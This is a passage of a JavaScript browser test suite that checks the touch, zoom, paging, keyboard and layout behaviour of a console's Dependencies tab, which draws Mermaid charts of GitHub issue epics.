  const lineRead = () => page.evaluate(() => { const s = document.getElementById('cp-graph-state'); return { open: s.hasAttribute('data-open'), cut: s.scrollHeight > s.clientHeight + 1 }; });
  const line0 = await lineRead();
  await page.touchscreen.tap(line.x, line.y);
  await sleep(200);
  const line1 = await lineRead();
  await page.touchscreen.tap(line.x, line.y);
  await sleep(200);
  const line2 = await lineRead();
  // from the focus, Previous: the goals' chart with the tiles back
  await page.tap('#cp-graph .graph__section:not([hidden]) .graph__prev');
  await sleep(600);
  const left = await page.evaluate(() => ({ shown: Array.from(document.querySelectorAll('#cp-graph .graph__section')).filter((s) => !s.hidden).map((s) => s.getAttribute('data-focus')).join(), tiles: getComputedStyle(document.getElementById('cp-graph-focus')).display, near: document.getElementById('tab-dependencies').classList.contains('graph--near') }));
  console.log('     a pinch:', whole.k, '->', pinched.k, '| the finger left drawn by -50, -40:', JSON.stringify([panned.x - pinched.x, panned.y - pinched.y]), '| after a finger\'s press:', JSON.stringify(ring), '| by the keyboard:', JSON.stringify(keyed), '| two taps apart:', JSON.stringify([two.open, two.num]), '| the line:', JSON.stringify([line0, line1, line2]), '| Previous from the focus:', JSON.stringify(left));
  assert.ok(pinched.k > whole.k * 1.5, 'the pinch did not zoom in');
  assert.ok(Math.abs(panned.x - pinched.x + 50) <= 3 && Math.abs(panned.y - pinched.y + 40) <= 3, 'the finger left after the pinch did not pan the chart');
  assert.deepEqual([ring.stage, ring.outline], [true, 'none'], 'a finger\'s press did not give the stage the keyboard, or drew a ring round it');
  // a page opened at its address with its sign-in kept, where nothing was pressed before the finger's
  // tap: there Chrome counts the focus the tap gives the stage as the keyboard's, the case in which
  // a ring would be drawn
  const kept = await open(fixtureRoutes(fixture()), { viewport: { width: 390, height: 844 }, mobile: true, path: '/symphony/control/?repo=acme/demo#dependencies',
    storage: { symphony_panel_token: 'github_pat_TEST', symphony_panel_repos: JSON.stringify(['acme/demo']), symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await kept.page.waitForSelector('#cp-app:not(.hidden)', { timeout: 8000 });
  await waitGraph(kept.page, /^Drawn from 4 reads/, 15000);
  await sleep(400);
  const spot = await stageMid(kept.page);
  await kept.page.touchscreen.tap(spot.x, spot.y);
  await sleep(100);
  const firstTap = await ringRead(kept.page);
  assert.deepEqual(kept.errors, []);
  await kept.context.close();
  console.log('     the first tap on a page opened at its address:', JSON.stringify(firstTap));
  assert.equal(firstTap.keyboards, true, 'Chrome did not count the first tap\'s focus as the keyboard\'s, so the ring\'s absence says nothing');
  assert.deepEqual([firstTap.stage, firstTap.outline], [true, 'none'], 'the first tap on a page opened at its address drew a ring round the stage');
  assert.deepEqual(keyed.stage && keyed.outline !== 'none', true, 'the keyboard\'s way to the stage draws no ring');
  assert.deepEqual([two.open, two.num], [true, '#23'], 'two quick taps on two nodes apart did not open the second in focus');
  assert.deepEqual([line0.open, line0.cut, line1.open, line1.cut, line2.open], [false, true, true, false, false], 'a tap on the line of what was drawn did not show it whole, or another did not cut it again');
  assert.deepEqual(left, { shown: 'goals', tiles: 'grid', near: false }, 'leaving a focus by Previous did not bring the tiles back');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BS: All never draws a cell smaller than a chart can be read in: with a goal and twelve epics at 1280 x 800 at 150%, each cell shown is 150 by 110 of the box\'s own pixels at the least, a page of them at a time under arrows that say where they stand, turned by them and by a swipe across a cell, every chart on one page', async () => {
  const { context, page, errors } = await open(manyRoutes(12), { extraRoutes: [stubRoute], viewport: { width: 1280, height: 800 } });
  await signIn(page);
  await waitGraph(page, /^Drawn from 13 reads/, 15000);
  await textTo(page, '#cp-zoom-up', 4);
  const size = await textSize(page);
  await pick(page, 'all');
  await sleep(500);
  const cells = () => page.evaluate(() => {
    const box = document.getElementById('cp-graph'), b = box.getBoundingClientRect(), z = box.offsetWidth ? b.width / box.offsetWidth : 1;
    const shown = Array.from(box.querySelectorAll('.graph__section')).filter((s) => !s.hidden);
    const pager = document.getElementById('cp-graph-allpager');
    return { keys: shown.map((s) => s.getAttribute('data-focus')), least: [Math.min.apply(null, shown.map((s) => s.getBoundingClientRect().width / z)), Math.min.apply(null, shown.map((s) => s.getBoundingClientRect().height / z))].map(Math.round),
      at: pager && !pager.hidden ? pager.querySelector('.graph__pos').textContent : null, inside: shown.every((s) => { const r = s.getBoundingClientRect(); return r.left >= b.left - 1 && r.right <= b.right + 1 && r.top >= b.top - 1 && r.bottom <= b.bottom + 1; }) };
  });
  const pages = [await cells()];
  for (let i = 0; i < 14; i++) {
    const next = '#cp-graph-allpager .graph__page[data-step="1"]';
    if (!(await page.$(next)) || await page.$eval(next, (x) => x.disabled)) break;
    await page.click(next);
    await sleep(300);
    pages.push(await cells());
  }
  // a swipe to the right across a cell turns back a page
  const c = await midOf(page, '#cp-graph .graph__section:not([hidden]) .control__chart');
  await drag(page, { x: c.x - 60, y: c.y }, { x: c.x + 60, y: c.y });
  await sleep(400);
  const swiped = await cells();
  console.log('     1280 x 800 at ' + size + ':', JSON.stringify(pages), '| a swipe back:', swiped.at);
  const seenKeys = new Set(pages.flatMap((p) => p.keys));
  assert.ok(pages.length > 1, 'All drew every cell on one page, so its pages say nothing');
  for (const p of pages) {
    assert.ok(p.least[0] >= 149 && p.least[1] >= 109, 'All drew a cell under 150 by 110: ' + JSON.stringify(p.least));
    assert.ok(p.inside, 'a cell of All runs past the charts\' box');
    assert.match(p.at || '', /^Page [0-9]+ of [0-9]+$/, 'All\'s arrows do not say where they stand');
  }
  assert.equal(seenKeys.size, 13, 'a chart is on no page of All');
  assert.equal(swiped.at, pages[pages.length - 2].at, 'a swipe across a cell did not turn All back a page');
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BT: where the tab is short an epic\'s tile says its number before its title, so epics whose titles begin alike still differ; a card\'s heading of any length takes two lines at the most, its whole in its tooltip; and on a computer the key stands in its line where it fits and folds behind its Key button where it would be cut or the tab is short, never cut either way', async () => {
  const { context, page, errors } = await open(manyRoutes(5), { extraRoutes: [stubRoute], viewport: { width: 1440, height: 900 } });
  await signIn(page);
  await waitGraph(page, /^Drawn from 6 reads/, 15000);
  await pick(page, 'epic-300');
  await sleep(400);
  const head = () => page.evaluate(() => {
    const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden), h = sec.querySelector('.graph__head h3');
    const line = parseFloat(getComputedStyle(h).lineHeight) || parseFloat(getComputedStyle(h).fontSize) * 1.2;
    // a short tab hides the heading but for readers, its tile naming the chart, so its lines count
    // only where it is shown
    return { shown: h.offsetHeight > 2, lines: Math.round(h.offsetHeight / line * 10) / 10, cut: h.scrollHeight > h.clientHeight + 1, tooltip: h.getAttribute('title') === h.textContent, words: h.textContent.length };
  });
  const key = () => page.evaluate(() => {
    const k = document.getElementById('cp-graph-key'), b = document.getElementById('cp-graph-keybtn');
    return { fold: document.getElementById('tab-dependencies').classList.contains('graph--keyfold'), key: getComputedStyle(k).display, button: getComputedStyle(b).display, past: k.scrollWidth - k.clientWidth };
  });
  const usual = await head(), keyUsual = await key();
  await textTo(page, '#cp-zoom-up', 5);
  await sleep(300);
  const large = await head(), keyLarge = await key(), size = await textSize(page);
  const short = await page.evaluate(() => document.getElementById('tab-dependencies').classList.contains('graph--short'));
  const tiles = await page.$$eval('#cp-graph-focus .graph__chip:not([hidden]) .graph__ttitle[data-num]', (ts) => ts.map((t) => [t.getAttribute('data-num'), getComputedStyle(t, '::before').content]));
  const cutLarge = await overflows(page);
  // a short laptop window, 1280 x 640, where the tab is under the height the key's line may take
  // from the stage; at 1280 x 720 the tab, 672 px tall, has the room for the key's line (since 2026-10-20 the foot and the Ask Claude bar are gone and the tab takes the window's height but for its head)
  const small = await open(manyRoutes(5), { extraRoutes: [stubRoute], viewport: { width: 1280, height: 640 } });
  await signIn(small.page);
  await waitGraph(small.page, /^Drawn from 6 reads/, 15000);
  await sleep(300);
  const keySmall = await small.page.evaluate(() => ({ fold: document.getElementById('tab-dependencies').classList.contains('graph--keyfold'), tab: document.getElementById('tab-dependencies').clientHeight }));
  const cutSmall = await overflows(small.page);
  assert.deepEqual(small.errors, []);
  await small.context.close();
  console.log('     epic #300\'s heading at 100%:', JSON.stringify(usual), 'at ' + size + ':', JSON.stringify(large), '| the key at 100%:', JSON.stringify(keyUsual), 'at ' + size + ':', JSON.stringify(keyLarge), 'at 1280 x 640:', JSON.stringify(keySmall), '| short:', short, '| the tiles:', JSON.stringify(tiles));
  assert.deepEqual([cutLarge, cutSmall], [[], []], 'something holds more than its box: ' + JSON.stringify([cutLarge, cutSmall]));
  assert.equal(keySmall.fold, true, 'at 1280 x 640, a tab ' + keySmall.tab + ' px tall, the key does not fold, so its line takes the stage\'s room');
  for (const [at, h] of [['100%', usual], [size, large]]) {
    assert.ok(!h.shown || h.lines <= 2.05, 'at ' + at + ' the heading takes more than two lines: ' + h.lines);
    assert.equal(h.tooltip, true, 'at ' + at + ' the heading has no tooltip that holds it whole');
  }
  assert.ok(usual.shown && usual.cut && usual.lines > 1.5, 'at 100% the heading is not shown on two lines and cut, so its two lines say nothing: ' + JSON.stringify(usual));
  assert.deepEqual([keyUsual.fold, keyUsual.key, keyUsual.button, keyUsual.past <= 1], [false, 'flex', 'none', true], 'at 100% on 1440 x 900 the key does not stand whole in its line');
  assert.deepEqual([keyLarge.fold, keyLarge.key, keyLarge.button !== 'none'], [true, 'none', true], 'at ' + size + ' the key does not fold behind its Key button');
  assert.equal(short, true, 'the tab is not short at ' + size + ', so the tiles\' short form says nothing');
  assert.ok(tiles.length >= 2 && tiles.every(([num, before]) => before === '"' + num + ' "'), 'a short tab\'s epic tiles do not say their numbers: ' + JSON.stringify(tiles));
  assert.deepEqual(errors, []);
  await context.close();
});

// an epic of three tasks, #61 blocking #62 and #63 and #62 blocking #63, so from #61 its two
// neighbours lie the same way, one nearer than the other
function tieRoutes() {
  const a = issue(61, 'First', ['todo']), b = issue(62, 'Second', ['todo'], deps(1, 1)), c = issue(63, 'Third', ['todo'], deps(2, 2));
  const routes = baseRoutes('acme/demo', [issue(60, 'A tie', ['epic'], subs(0, 3)), a, b, c]);
  routes['GET /repos/acme/demo/issues/60/sub_issues'] = [a, b, c];
  routes['GET /repos/acme/demo/issues/62/dependencies/blocked_by'] = [a];
  routes['GET /repos/acme/demo/issues/63/dependencies/blocked_by'] = [a, b];
  return routes;
}
await check('BU: a zoomed chart keeps inside its edges when its stage changes size; a focus drawn once is kept, so moving back and forth between two neighbours draws nothing again; of two neighbours the same way a swipe goes to the nearer; and a short swipe of the mouse that starts and ends on one tile turns the tiles\' page and presses no tile', async () => {
  // the clamp: epic #20 zoomed in and dragged to its far corner, then the window made narrower and wider
  const z = await open(fixtureRoutes(fixture()), { viewport: { width: 1366, height: 768 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(z.page);
  await z.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(z.page, /^Drawn from 4 reads/, 15000);
  await sleep(300);
  for (let i = 0; i < 3; i++) await z.page.click(ZOOM_IN);
  await sleep(400);
  const spot = await freeSpot(z.page);
  await drag(z.page, spot, { x: spot.x - 3000, y: spot.y - 3000 }, 12);
  const gaps = [];
  for (const width of [1100, 1600]) {
    await z.page.setViewportSize({ width, height: 768 });
    await sleep(600);
    const s = await stageRead(z.page);
    const pw = (s.pic.r - s.pic.l) / s.z, ph = (s.pic.b - s.pic.t) / s.z;
    const sides = [s.pic.l - s.inner.l, s.inner.r - s.pic.r, s.pic.t - s.inner.t, s.inner.b - s.pic.b].map((v) => Math.round(v / s.z));
    gaps.push({ width, sides, larger: [pw > s.box[0] - 24, ph > s.box[1] - 24] });
  }
  // the cache: Mermaid's renders counted while the focus moves #22, #23, #22, #23
  const renders = await z.page.evaluate(() => { const m = window.mermaid; if (!m || !m.render) return false; const r = m.render; window.__renders = 0; m.render = function () { window.__renders++; return r.apply(this, arguments); }; return true; });
  await z.page.click('#cp-graph .graph__section:not([hidden]) .graph__fit');
  await sleep(400);
  const counts = [];
  for (const n of [22, 23, 22, 23]) {
    const p = await nodeAt(z.page, n);
    await z.page.mouse.click(p.x, p.y);
    await waitNear(z.page, n);
    await sleep(300);
    counts.push(await z.page.evaluate(() => window.__renders));
  }
  assert.deepEqual(z.errors, []);
  await z.context.close();
  // the tie: #61's focus, its two neighbours the same way, and the arrow key that way
  const t = await open(tieRoutes(), { viewport: { width: 1366, height: 768 } });
  await signIn(t.page);
  await t.page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(t.page, /^Drawn from 3 reads/, 15000);
  await sleep(300);
  const a = await nodeAt(t.page, 61);
  await t.page.mouse.click(a.x, a.y);
  await waitNear(t.page, 61);
  await sleep(400);
  const f = await stageRead(t.page), n61 = f.nodes.find((g) => g.n === 61), n62 = f.nodes.find((g) => g.n === 62), n63 = f.nodes.find((g) => g.n === 63);
  const way = (g) => Math.atan2(g.y - n61.y, g.x - n61.x) * 180 / Math.PI;
  const dx = n62.x - n61.x, dy = n62.y - n61.y;
  // a swipe the way halfway between the two, so both lie at one angle to it; the picture follows the
  // finger, so the swipe is drawn the other way, as a map is
  const half = (way(n62) + way(n63)) / 2 * Math.PI / 180, mid = await stageMid(t.page);
  await drag(t.page, mid, { x: mid.x - 220 * Math.cos(half), y: mid.y - 220 * Math.sin(half) }, 10);
  await waitNear(t.page, 62).catch(() => {});
  await sleep(300);
  const tie = await nearRead(t.page);
  assert.deepEqual(t.errors, []);
  await t.context.close();
  // the short swipe on one tile, drawn by the mouse on a laptop's tiles, a goal and twelve epics, where
  // a press and its release on one tile make a click, which a finger's swipe never does; at 1280 x
  // 640, since at 1280 x 720 the deck, which takes the whole window with the site's bar hidden over
  // it, spares the tiles a second row and all of them fit on one page (since 2026-10-20 the foot and the Ask Claude bar are gone and the tab takes the window's height but for its head)
  const s = await open(manyRoutes(12), { extraRoutes: [stubRoute], viewport: { width: 1280, height: 640 } });
  await signIn(s.page);
  await waitGraph(s.page, /^Drawn from 13 reads/, 15000);
  await sleep(300);
  const before = await s.page.evaluate(() => ({ shown: Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => !b.hidden).map((b) => b.getAttribute('data-focus')), pressed: document.querySelector('#cp-graph-focus .graph__chip[aria-pressed="true"]').getAttribute('data-focus') }));
  const tile = await s.page.evaluate(() => { const b = Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((c) => !c.hidden).pop(), r = b.getBoundingClientRect(); return { l: r.left, r: r.right, y: r.top + r.height / 2, w: r.width }; });
  await drag(s.page, { x: tile.r - 6, y: tile.y }, { x: tile.r - 50, y: tile.y }, 6);
  await sleep(400);
  const after = await s.page.evaluate(() => ({ shown: Array.from(document.querySelectorAll('#cp-graph-focus .graph__chip')).filter((b) => !b.hidden).map((b) => b.getAttribute('data-focus')), pressed: document.querySelector('#cp-graph-focus .graph__chip[aria-pressed="true"]').getAttribute('data-focus') }));
  assert.deepEqual(s.errors, []);
  await s.context.close();
  console.log('     the zoomed chart\'s sides after the window changed:', JSON.stringify(gaps), '| renders after #22, #23, #22, #23:', renders, JSON.stringify(counts), '| from #61:', JSON.stringify([Math.round(way(n62)), Math.round(way(n63))]), 'a swipe between them to', tie.num, '| a 44 px swipe on one tile ' + Math.round(tile.w) + ' px wide:', JSON.stringify([before, after]));
  for (const g of gaps) {
    if (g.larger[0]) assert.ok(g.sides[0] <= 13 && g.sides[1] <= 13, 'at ' + g.width + ' px the zoomed chart hangs off its stage sideways: ' + JSON.stringify(g.sides));
    if (g.larger[1]) assert.ok(g.sides[2] <= 13 && g.sides[3] <= 13, 'at ' + g.width + ' px the zoomed chart hangs off its stage up or down: ' + JSON.stringify(g.sides));
  }
  assert.ok(gaps.some((g) => g.larger[0] || g.larger[1]), 'the chart was not larger than its stage, so the clamp says nothing');
  assert.equal(renders, true, 'Mermaid\'s render could not be counted');
  assert.ok(counts[1] > counts[0] && counts[0] > 0, 'the focus was not drawn at all: ' + JSON.stringify(counts));
  assert.deepEqual([counts[2], counts[3]], [counts[1], counts[1]], 'moving back to a focus drawn before drew it again: ' + JSON.stringify(counts));
  assert.ok(Math.abs(way(n62) - way(n63)) < 60 && Math.hypot(n63.x - n61.x, n63.y - n61.y) > Math.hypot(dx, dy) * 1.3, 'from #61 its neighbours do not lie one way at two distances, so the tie says nothing');
  assert.equal(tie.num, '#62', 'a swipe went to the farther of two neighbours the same way');
  assert.notDeepEqual(after.shown, before.shown, 'a short swipe on one tile did not turn the tiles\' page');
  assert.equal(after.pressed, before.pressed, 'a short swipe on one tile pressed it');
});

// BV to BY: the zoom beside the console's own sizing and the site's bar that hides itself (site pull
// request #93): the bar hidden above the held tab on a phone and brought back over it by its handle
// (BV), a foot the person sized leaving the tab its least (BW), one Escape doing one thing with the
// bar shown (BX), and every chart staying whole as the foot, the side column, the window and the
// bar change round it (BY).

// the site's bar as the held tab sees it: whether it is shown and seen, its box, the handle's, the
// rail's and the tab's places, the window's offset, the shown chart's transform and the tile pressed
const barOver = (page) => page.evaluate(() => {
  const r = (e) => { if (!e || !e.getClientRects().length) return null; const b = e.getBoundingClientRect(); return { l: Math.round(b.left), t: Math.round(b.top), r: Math.round(b.right), b: Math.round(b.bottom) }; };
  const sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const svg = sec && Array.from(sec.querySelectorAll('.control__chart > svg')).find((s) => s.style.display !== 'none');
  const nav = document.getElementById('nav'), pressed = document.querySelector('#cp-graph-focus [aria-pressed="true"]');
  return {
    shown: document.body.classList.contains('console-bar-shown'), nav: r(nav),
    seen: !!nav && nav.getClientRects().length > 0 && getComputedStyle(nav).visibility !== 'hidden' && nav.getBoundingClientRect().bottom > 0,
    // on a phone the tab fills the screen under its back bar, the rail being the home screen's
    // (site branch claude/project-thread-6cxgh2), so the bar stands where the rail stood
    handle: r(document.querySelector('.console__barhandle')), rail: r(document.querySelector('.console__phonebar')), back: r(document.getElementById('cp-back')), tab: r(document.getElementById('tab-dependencies')),
    y: Math.round(scrollY), picture: svg ? svg.style.transform : null, pressed: pressed ? pressed.getAttribute('data-focus') : null,
  };
});
// the rail's buttons that lie under the handle, the handle let through for the look, each marked *
// where it is the tab shown
const underHandle = (page) => page.evaluate(() => {
  const h = document.querySelector('.console__barhandle'), b = h.getBoundingClientRect(), seen = [];
  h.style.pointerEvents = 'none';
  for (let x = b.left + 1; x < b.right; x += 6) {
    for (const y of [b.top + 2, b.top + b.height / 2, b.bottom - 2]) {
      const at = document.elementFromPoint(x, y), tab = at && at.closest('[data-tab]');
      if (tab) seen.push(tab.getAttribute('data-tab') + (tab.getAttribute('aria-selected') === 'true' ? '*' : ''));
    }
  }
  h.style.pointerEvents = '';
  return Array.from(new Set(seen));
});
await check('BV: on a phone held either way the site\'s bar, hidden above the held tab, comes back over it from its handle: the handle at the window\'s top centre lies over no button of the rail but the shown tab\'s own; a tap and a swipe down from it each show the bar over the tab, held sideways as upright, with the page, the tab, its chart and its tiles left as they were, and it goes again after its wait; a swipe down a chart from near its top shows no bar; and a phone turned while the bar shows brings the tab back with the rail at the window\'s top and its whole height, as it stays once the bar has gone', async () => {
  const seen = {};
  for (const [width, height] of [[390, 844], [844, 390]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width, height }, mobile: true });
    const cdp = await context.newCDPSession(page);
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 4 reads/, 15000);
    await sleep(500);
    const rest = await barOver(page), under = await underHandle(page);
    assert.equal(rest.shown, false, what + ': the bar shows over the held tab before anyone asks for it');
    assert.ok(rest.nav && rest.nav.b <= 0, what + ': the bar takes the screen\'s top: ' + JSON.stringify(rest.nav));
    assert.ok(rest.handle && rest.handle.t === 0 && Math.abs((rest.handle.l + rest.handle.r) / 2 - width / 2) <= 1, what + ': no handle at the top centre: ' + JSON.stringify(rest.handle));
    assert.ok(rest.rail && rest.rail.t >= 0 && rest.rail.t < 48, what + ': the tab\'s back bar is not at the screen\'s top: ' + JSON.stringify(rest.rail));
    assert.ok(under.every((t) => t.endsWith('*')), what + ': the handle lies over a button of the rail other than the shown tab\'s: ' + JSON.stringify(under));
    assert.ok(rest.back && (rest.back.r <= rest.handle.l || rest.back.t >= rest.handle.b), what + ': the handle lies over the back button: ' + JSON.stringify([rest.back, rest.handle]));
    const same = (b, why) => assert.deepEqual([b.y, b.tab, b.rail, b.picture, b.pressed], [rest.y, rest.tab, rest.rail, rest.picture, rest.pressed], what + ': ' + why + ' moved the page, the tab, its chart or its tiles');
    const mid = { x: (rest.handle.l + rest.handle.r) / 2, y: (rest.handle.t + rest.handle.b) / 2 };
    await page.touchscreen.tap(mid.x, mid.y);
    await sleep(400);
    const tapped = await barOver(page);
    assert.ok(tapped.shown && tapped.seen, what + ': a tap on the handle showed no bar: ' + JSON.stringify(tapped.nav));
    same(tapped, 'the tap on the handle');
    await sleep(4600);
    assert.equal((await barOver(page)).shown, false, what + ': the bar stayed past its wait');
    await swipe(cdp, mid, { x: mid.x, y: mid.y + 140 }, 8);
    await sleep(300);
    const swiped = await barOver(page);
    assert.ok(swiped.shown && swiped.seen, what + ': a swipe down from the handle showed no bar: ' + JSON.stringify(swiped.nav));
    same(swiped, 'the swipe down from the handle');
    await sleep(4600);
    // a swipe down a chart from near its top is the chart's, never the bar's
    const st = await stageRead(page), x = (st.inner.l + st.inner.r) / 2;
    await swipe(cdp, { x, y: st.inner.t + 8 }, { x, y: st.inner.t + 120 }, 8);
    await sleep(400);
    const onChart = await barOver(page);
    assert.deepEqual([onChart.shown, onChart.y], [false, rest.y], what + ': a swipe down a chart showed the bar or moved the page');
    // turned while the bar shows, and back
    await page.touchscreen.tap(mid.x, mid.y);
    await sleep(300);
    await page.setViewportSize({ width: height, height: width });
    await sleep(700);
    await page.setViewportSize({ width, height });
    await sleep(700);
    const turned = await barOver(page);
    await sleep(4600);
    const after = await barOver(page);
    seen[what] = { nav: rest.nav, handle: rest.handle, under, tapped: tapped.nav, swiped: swiped.nav, turned: [turned.shown, turned.rail, turned.tab], after: [after.shown, after.rail, after.tab] };
    assert.equal(turned.shown, true, what + ': the bar went before the phone was turned back, so the turn says nothing');
    for (const [when, b] of [['turned while the bar showed', turned], ['once the bar went', after]]) {
      assert.deepEqual(b.rail, rest.rail, what + ', ' + when + ': the back bar is not where it was: ' + JSON.stringify(b.rail));
      assert.deepEqual(b.tab, rest.tab, what + ', ' + when + ': the tab did not take back its whole height');
    }
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
});

// the note over the screen's foot and the tab against each other: the note's box (none, at the
// window's bottom, while it is empty), the tab's box and its height in its own pixels, the shown
// stage's box and the window's offset
const footTab = (page) => page.evaluate(() => {
  const r = (e) => { const b = e.getBoundingClientRect(); return { t: Math.round(b.top), b: Math.round(b.bottom), h: Math.round(b.height) }; };
  const tab = document.getElementById('tab-dependencies'), sec = Array.from(document.querySelectorAll('#cp-graph .graph__section')).find((s) => !s.hidden);
  const shown = !!document.getElementById('msg').firstChild;
  return {
    foot: shown ? r(document.querySelector('.console__status')) : { t: innerHeight, b: innerHeight, h: 0 }, shown,
    tab: tab.hidden ? null : r(tab), own: tab.hidden ? 0 : tab.clientHeight, stage: sec && !tab.hidden ? r(sec.querySelector('.control__chart')) : null, y: Math.round(scrollY), ih: innerHeight,
  };
});
// the tab and its stage wholly above the note, the tab at its least or taller
function assertAboveFoot(f, what, least) {
  assert.ok(f.tab && f.tab.b <= f.foot.t + 1 && f.stage.b <= f.foot.t + 1, what + ': the tab or its stage runs under the note: ' + JSON.stringify(f));
  if (least) assert.ok(f.own >= least - 1, what + ': the tab is ' + f.own + ' of its pixels tall, under its least of ' + least);
}
// a note of several lines said over the screen's foot, a warning so it stays until cleared
const sayLong = (page) => page.evaluate(() => {
  const m = document.getElementById('msg');
  m.textContent = '';
  const p = document.createElement('p');
  p.className = 'msg__note';
  p.textContent = 'A long note over the screen\'s foot. '.repeat(14);
  m.appendChild(p);
  m.className = 'admin__box admin__warn';
});
const clearNote = (page) => page.click('#cp-msg-close');
await check('BW: a long note over the screen\'s foot leaves the Dependencies tab and its stage wholly above it and every chart whole, on a phone, a short screen and laptops, and once cleared the tab takes back the window\'s height (the foot the person sized, which this held before, went with the foot on 2026-10-20)', async () => {
  const seen = {};
  for (const [width, height, mobile, least] of [[390, 844, true, 280], [900, 500, false, 0], [1366, 768, false, 280], [1280, 720, false, 280]]) {
    const what = width + ' x ' + height;
    const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width, height }, mobile });
    await signIn(page);
    await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
    await waitGraph(page, /^Drawn from 4 reads/, 15000);
    await sayLong(page);
    await sleep(600);
    const said = await footTab(page);
    assert.ok(said.shown && said.foot.h > 60, what + ': the long note does not show, so its bound says nothing: ' + JSON.stringify(said.foot));
    assertAboveFoot(said, what + ', a long note shown', least);
    await everyChart(page, what + ', a long note shown');
    await clearNote(page);
    await sleep(600);
    const cleared = await footTab(page);
    assert.ok(!cleared.shown && cleared.tab.b >= cleared.ih - 40, what + ': once cleared the tab did not take back the window\'s height: ' + JSON.stringify(cleared));
    seen[what] = { said: [said.foot, said.tab, said.own], cleared: cleared.tab };
    assert.deepEqual(errors, [], what);
    await context.close();
  }
  console.log('     ' + JSON.stringify(seen));
});

await check('BX: one Escape does one thing with the site\'s bar shown over the Dependencies tab: with the keyboard in the bar it sends the bar away and leaves the tab\'s help open; with the bar brought by the pointer, Escape goes back from a node\'s focus, closes the folded key and closes the help, from inside the tab and from the page itself, each leaving the bar, and the next Escape, which nothing else takes, sends the bar away', async () => {
  // 1280 x 640, where the key folds behind its Key button; at 1280 x 720 the tab is tall enough for
  // its line since the foot and the Ask Claude bar went on 2026-10-20 (BT)
  const { context, page, errors } = await open(fixtureRoutes(fixture()), { viewport: { width: 1280, height: 640 }, storage: { symphony_panel_graph_focus: JSON.stringify({ 'acme/demo': 'epic-20' }) } });
  await signIn(page);
  await page.waitForSelector('#cp-graph svg', { state: 'attached', timeout: 15000 });
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(400);
  const state = () => page.evaluate(() => ({
    bar: document.body.classList.contains('console-bar-shown'), help: document.querySelector('#tab-dependencies .console__help').open,
    key: document.getElementById('cp-graph-keybtn').getAttribute('aria-expanded') === 'true',
    near: !!document.querySelector('#cp-graph .graph__section:not([hidden]) .control__chart > svg.graph__nearsvg'),
    inBar: !!document.activeElement && !!document.activeElement.closest('#nav, #flyouts'),
  }));
  const barByPointer = async () => {
    await page.mouse.move(640, 300);
    await page.mouse.move(640, 3, { steps: 10 });
    await page.waitForFunction(() => document.body.classList.contains('console-bar-shown'), null, { timeout: 3000 });
    await page.mouse.move(640, 30, { steps: 3 });
  };
  const seen = {};
  const helpOpen = async () => { await page.click('#tab-dependencies .console__help > summary'); await page.waitForFunction(() => document.querySelector('#tab-dependencies .console__help').open, null, { timeout: 3000 }); };
  // the keyboard in the bar, the help open under it
  await helpOpen();
  await page.focus('#navLinks a');
  await sleep(200);
  const inBar = await state();
  await page.keyboard.press('Escape');
  await sleep(300);
  seen['the keyboard in the bar'] = [inBar, await state()];
  assert.deepEqual([inBar.bar, inBar.inBar, inBar.help], [true, true, true], 'the keyboard in the bar did not show it over the open help');
  assert.deepEqual(Object.values(await state()).slice(0, 2), [false, true], 'Escape with the keyboard in the bar did not send the bar away alone: ' + JSON.stringify(await state()));
  await page.click('#tab-dependencies .console__help > summary');
  await sleep(300);
  // the bar brought by the pointer over each thing Escape closes; the first Escape closes that, the
  // second sends the bar away
  const ways = {
    'a node\'s focus, the keyboard on its stage': [async () => { const p = await nodeAt(page, 22); await page.mouse.click(p.x, p.y); await waitNear(page, 22); await page.focus(STAGE_SHOWN); }, (s) => s.near],
    'the folded key': [async () => { await page.click('#cp-graph-keybtn'); }, (s) => s.key],
    'the help, the keyboard on its ?': [helpOpen, (s) => s.help],
    'the help, the keyboard on the page': [async () => { await helpOpen(); await page.evaluate(() => document.activeElement.blur()); }, (s) => s.help],
  };
  for (const [what, [make, isOpen]] of Object.entries(ways)) {
    await make();
    await sleep(300);
    await barByPointer();
    const before = await state();
    await page.keyboard.press('Escape');
    await sleep(300);
    const first = await state();
    await page.keyboard.press('Escape');
    await sleep(300);
    const second = await state();
    seen[what] = [before, first, second];
    assert.deepEqual([isOpen(before), before.bar], [true, true], what + ': not open with the bar shown over it, so Escape says nothing');
    assert.deepEqual([isOpen(first), first.bar], [false, true], what + ': the first Escape did not close it alone, leaving the bar');
    assert.equal(second.bar, false, what + ': the second Escape, which nothing else took, did not send the bar away');
    await page.mouse.move(640, 500);
    await sleep(900);
  }
  console.log('     ' + JSON.stringify(seen));
  assert.deepEqual(errors, []);
  await context.close();
});

await check('BY: on a laptop every Dependencies chart stays whole on its stage as the console changes round it: a long note said over the screen\'s foot and cleared (the foot sized by its grip went with the foot), the side column wider and narrower by its grip, the window made smaller and larger, and the site\'s bar brought over the deck by the pointer and sent away, which leaves each chart where it was; nothing past its box and nothing under the foot', async () => {
  const { context, page, errors } = await open(manyRoutes(3), { extraRoutes: [stubRoute], viewport: { width: 1366, height: 768 } });
  await signIn(page);
  await waitGraph(page, /^Drawn from 4 reads/, 15000);
  await sleep(500);
  const whole = async (what) => {
    await sleep(400);
    for (const key of ['goals', 'all']) {
      await pick(page, key);
      await sleep(300);
      assert.deepEqual(await overflows(page), [], what + ', ' + key + ' shown: something holds more than its box');
